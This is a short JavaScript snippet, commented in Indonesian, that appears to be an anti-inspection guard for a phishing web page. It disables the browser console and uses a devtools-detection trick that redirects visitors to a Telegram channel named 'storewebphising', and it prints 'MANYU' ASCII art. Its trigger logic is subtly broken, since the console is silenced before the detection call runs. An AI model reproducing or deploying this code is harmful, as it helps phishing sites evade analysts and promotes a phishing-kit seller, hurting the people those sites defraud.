(function() {
    // Menampilkan ASCII art saat konsol dibuka
    var asciiArt = `
███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗██╗░░░██╗
████╗░████║██╔══██╗████╗░██║╚██╗░██╔╝██║░░░██║
██╔████╔██║███████║██╔██╗██║░╚████╔╝░██║░░░██║
██║╚██╔╝██║██╔══██║██║╚████║░░╚██╔╝░░██║░░░██║
██║░╚═╝░██║██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
    `;

    // Menonaktifkan akses ke console
    Object.defineProperty(window, 'console', {
        get: function() {
            return {
                log: function() {},
                warn: function() {},
                error: function() {},
                info: function() {}
            };
        }
    });

    // Menambahkan pesan saat Developer Tools dibuka
    var devtools = /./;
    devtools.toString = function() {
        console.log(asciiArt);  // Menampilkan ASCII art di konsol
        window.location.href = 'https://t.me/storewebphising';  // Mengarahkan ke URL
    };
    console.log(devtools);  // Memicu untuk membuka devtools
})();
